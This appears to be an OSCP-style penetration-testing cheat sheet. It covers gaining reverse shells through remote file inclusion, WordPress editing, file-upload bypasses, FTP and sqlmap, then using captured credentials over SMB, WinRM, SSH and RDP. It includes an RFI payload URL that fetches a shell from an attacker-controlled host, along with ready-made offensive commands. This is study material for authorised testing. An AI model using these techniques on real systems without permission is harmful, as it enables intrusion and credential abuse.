# Table of Conents

# Reverse-Shells

## Note-About-Shell-Ports
Regardless of the route you're taking to attempt to gain a reverse shell, it's important that you try different ports to use on a host if your shell won't connect back. A target's firewall may be restricting the traffic, and only certain ports will be allowed through. A common list of ports to use for a revers shell are:
```
53
80
8080
443
```
These ports are typically allowed through a firewall and should let your shell connect through.

## RFI
If you've found a website that is vulnerable to RFI, you can use it to include a reverse shell from a server you control:
```
http://www.example.com/foo.php?bar=<http://<YOUR-IP>/shell.php
```

## WordPress-Editor
If you have access to a WordPress site, check to see if you can modify any of the .php pages with the Editor. If you can, you can modify the content of a page to include a PHP reverse shell.

## Unrestricted-File-Upload
If you come across a web site that lets you upload any type of file extension, you should try uploading a reverse shell to see if you can then access it.

## File-Extension-Bypass
If you come across a web site that allows you to upload only certain types of files, you can try bypassing the restriction. Common techniques are to play with the extension formatting like shell.php.png, or even going so far as to modifying the magic bytes of a file so that it is detected as a different file type.

### Burp-Intercept
If you are having trouble getting a reverse shell uploaded to a target, sometimes you can intercept an upload request that you know works in Burp. You can then attempt to modify the request and forward it, inserting your reverse shell payload.

## FTP-Upload
If you have access to an FTP server, you should check to see if you have the ability to write to any directories that can be called from the web server. It's important to set the binary mode to 1 when uploading shell files to an FTP server.

## SQL-Injection-Shells
It is sometimes possible to obtain reverse shells through SQL injection. One of the common tools to acheive this is sqlmap (not allowed on the OSCP exam):

```
sqlmap -u http://<TARGET> --dbms=mysql --os-shell
```


# Credentials

## SMB

#### smbmap
If you have credentials and SMB is open on a host, you should use smbmap to see what shares the credentials can access:

```
smbmap -H <TARGET> -u "<USERNANE>" -p "<PASSWORD>"
```    

#### crackmapexec
If you have credentials and want to see what level of access you have to various services, use crackmapexec:
```
crackmapexec <smb, ssh, rdp> <IP> -u <USER> -p <PASSWORD>
```

#### psexec-py
If you have credentials that can access SMB on a server, and you can write to an SMB share on the server, use psexec-py to attempt to gain a reverse shell:
```
# Windows
python psexec.py <USER>:<PASSWORD>@<IP>cmd -path c:\\\\windows\\\\system32\\\\

# Linux
python psexec.py <USER>:<PASSWORD>@<IP>bash -path \\\\bin\\\\

```

## WinRM
```
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

## SSH
If you have credentials and SSH is open on a host, try them:
```
ssh <USER>@<TARGET>
```

## RDP
If you have credentials and RDP is open on a host, try them:
```
rdesktop <TARGET>
```



